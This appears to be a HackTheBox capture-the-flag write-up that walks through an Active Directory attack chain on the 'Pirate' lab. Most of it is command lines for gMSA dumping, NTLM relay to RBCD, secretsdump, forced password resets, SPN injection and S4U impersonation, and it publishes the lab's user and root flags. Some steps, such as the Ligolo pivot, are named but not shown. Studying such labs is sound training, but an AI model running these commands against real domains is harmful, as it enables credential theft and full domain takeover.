# 🏴‍☠️ Pirate — HackTheBox Writeup (Active Directory)

> **Difficulty:** Medium  
> **Domain:** PIRATE.HTB  
> **Target IP:** <Target_Machine_IP>  
> **Author:** Mrs.Nobody  

---

# 📚 Table of Contents

- [Overview](#-overview)
- [Flags](#-flags)
- [1️⃣ Initial Setup](#1️⃣-initial-setup)
- [2️⃣ Pre-Windows 2000 Abuse (MS01$)](#2️⃣-pre-windows-2000-abuse-ms01)
- [3️⃣ Dump gMSA Passwords](#3️⃣-dump-gmsa-passwords)
- [4️⃣ Shell on DC01](#4️⃣-shell-on-dc01)
- [5️⃣ Pivot to Internal Network (Ligolo)](#5️⃣-pivot-to-internal-network-ligolo)
- [6️⃣ NTLM Relay → RBCD → Admin on WEB01](#6️⃣-ntlm-relay--rbcd--admin-on-web01)
- [7️⃣ User Flag](#7️⃣-user-flag)
- [8️⃣ Dump Credentials from WEB01](#8️⃣-dump-credentials-from-web01)
- [9️⃣ Reset Delegated Admin Password](#9️⃣-reset-delegated-admin-password)
- [🔟 SPN Injection (WriteSPN Abuse)](#-spn-injection-writespn-abuse)
- [1️⃣1️⃣ S4U Delegation → DC01 Administrator](#1️⃣1️⃣-s4u-delegation--dc01-administrator)
- [1️⃣2️⃣ Root Flag](#1️⃣2️⃣-root-flag)
- [Attack Path Summary](#-attack-path-summary)
- [Common Gotchas](#-common-gotchas)

---

# 🧠 Overview

This box abuses:

- Pre-Windows 2000 Compatible Access
- gMSA password dumping
- NTLM relay → RBCD
- Constrained delegation
- SPN injection
- S4U2Self + S4U2Proxy
- Kerberos ticket abuse

We escalate from:

```
MS01$ → gMSA → DC shell → Pivot → RBCD → WEB01 Admin
→ secretsdump → Reset delegated admin → SPN injection
→ S4U → Administrator on DC01 → root.txt
```

---

# 🚩 Flags

### 👤 User Flag

```
8af6758f07189ef50343d98ab6748d33
```

### 👑 Root Flag

```
b0c531c3049564d7e3a263a704e46b98
```

---

# 1️⃣ Initial Setup

## 🖥 ATTACK TERMINAL (Kali)

### Add Hosts

```bash
sudo nano /etc/hosts
```

Add:

```
<Target_Machine_IP>  DC01.pirate.htb pirate.htb MS01.pirate.htb
192.168.100.2        WEB01.pirate.htb
```

---

### Configure Kerberos

```bash
sudo nano /etc/krb5.conf
```

```
[libdefaults]
    default_realm = PIRATE.HTB
    dns_lookup_realm = false
    dns_lookup_kdc = false

[realms]
    PIRATE.HTB = {
        kdc = <Target_Machine_IP>
        admin_server = <Target_Machine_IP>
    }

[domain_realm]
    .pirate.htb = PIRATE.HTB
    pirate.htb = PIRATE.HTB
```

---

# 2️⃣ Pre-Windows 2000 Abuse (MS01$)

MS01$ is in **Pre-Windows 2000 Compatible Access**  
Machine password = machine name (`ms01`)

```bash
impacket-getTGT 'PIRATE.HTB/MS01$:ms01'
```

```bash
export KRB5CCNAME=MS01\$.ccache
klist
```

---

# 3️⃣ Dump gMSA Passwords

```bash
python3 gMSADumper.py -d pirate.htb -l dc01.pirate.htb -k
```

Recovered:

```
gMSA_ADFS_prod$:::8126756fb2e69697bfcb04816e685839
```

---

# 4️⃣ Shell on DC01

```bash
evil-winrm -i DC01.pirate.htb \
  -u 'gMSA_ADFS_prod$' \
  -H '8126756fb2e69697bfcb04816e685839'
```

---

# 5️⃣ Pivot to Internal Network (Ligolo)

Goal: Reach `192.168.100.2` (WEB01)

---

### Start NTLM Relay

```bash
ntlmrelayx.py -t ldaps://<Target_Machine_IP> --delegate-access --remove-mic -smb2support
```

---

# 6️⃣ RBCD → Administrator on WEB01

```bash
python3 /usr/share/doc/python3-impacket/examples/getST.py \
  -spn 'cifs/WEB01.pirate.htb' -impersonate 'Administrator' \
  'pirate.htb/VYSHKGDW$:PASSWORD' -dc-ip <Target_Machine_IP>
```

```bash
export KRB5CCNAME=Administrator@cifs_WEB01.pirate.htb@PIRATE.HTB.ccache
```

```bash
python3 /usr/share/doc/python3-impacket/examples/psexec.py \
  -k -no-pass Administrator@WEB01.pirate.htb
```

---

# 7️⃣ User Flag

```
type C:\Users\a.white\Desktop\user.txt
```

```
8af6758f07189ef50343d98ab6748d33
```

---

# 8️⃣ Dump Credentials from WEB01

```bash
secretsdump.py -k -no-pass WEB01.pirate.htb -outputfile web01_dump
```

Recovered:

```
PIRATE\a.white : E2nvAOKSz5Xz2MJu
```

---

# 9️⃣ Reset Delegated Admin Password

```bash
bloodyAD -d pirate.htb -u 'a.white' -p 'E2nvAOKSz5Xz2MJu' \
  -H <Target_Machine_IP> -i <Target_Machine_IP> \
  set password a.white_adm 'pulse1337!'
```

---

# 🔟 SPN Injection (WriteSPN Abuse)

⚠ MUST move BOTH:

- HTTP/WEB01.pirate.htb
- HTTP/WEB01

```bash
python3 addspn.py <Target_Machine_IP> -u 'PIRATE\a.white_adm' -p 'pulse1337!' \
  -t 'WEB01$' -s 'HTTP/WEB01.pirate.htb' --remove
```

```bash
python3 addspn.py <Target_Machine_IP> -u 'PIRATE\a.white_adm' -p 'pulse1337!' \
  -t 'WEB01$' -s 'HTTP/WEB01' --remove
```

```bash
python3 addspn.py <Target_Machine_IP> -u 'PIRATE\a.white_adm' -p 'pulse1337!' \
  -t 'DC01$' -s 'HTTP/WEB01.pirate.htb'
```

```bash
python3 addspn.py <Target_Machine_IP> -u 'PIRATE\a.white_adm' -p 'pulse1337!' \
  -t 'DC01$' -s 'HTTP/WEB01'
```

---

# 1️⃣1️⃣ S4U Delegation → DC01 Administrator

```bash
python3 /usr/share/doc/python3-impacket/examples/getST.py \
  -spn 'HTTP/WEB01.pirate.htb' -impersonate 'Administrator' \
  'pirate.htb/a.white_adm:pulse1337!' -dc-ip <Target_Machine_IP> \
  -altservice 'CIFS/DC01.pirate.htb'
```

```bash
export KRB5CCNAME=Administrator@CIFS_DC01.pirate.htb@PIRATE.HTB.ccache
klist
```

```bash
python3 /usr/share/doc/python3-impacket/examples/wmiexec.py \
  -k -no-pass pirate.htb/Administrator@DC01.pirate.htb
```

---

# 1️⃣2️⃣ Root Flag

```
type C:\Users\Administrator\Desktop\root.txt
```

```
b0c531c3049564d7e3a263a704e46b98
```

---

# 🧭 Attack Path Summary

```
MS01$ (Pre-Win2000)
    ↓
gMSA dump
    ↓
DC shell
    ↓
Ligolo pivot
    ↓
NTLM relay + RBCD
    ↓
Administrator on WEB01
    ↓
secretsdump
    ↓
Reset a.white_adm
    ↓
SPN injection
    ↓
S4U2Self + S4U2Proxy
    ↓
Administrator on DC01
    ↓
root.txt
```

---

# ⚠ Common Gotchas

- MUST move both:
  - `HTTP/WEB01.pirate.htb`
  - `HTTP/WEB01`
- If `getST.py` not found → use full path
- Always confirm ticket with `klist`
- Kerberos time sync matters
- Use `wmiexec.py` if `psexec.py` fails

---

# 🏁 Completed

User and Root both captured successfully.

Happy Hacking 🏴‍☠️
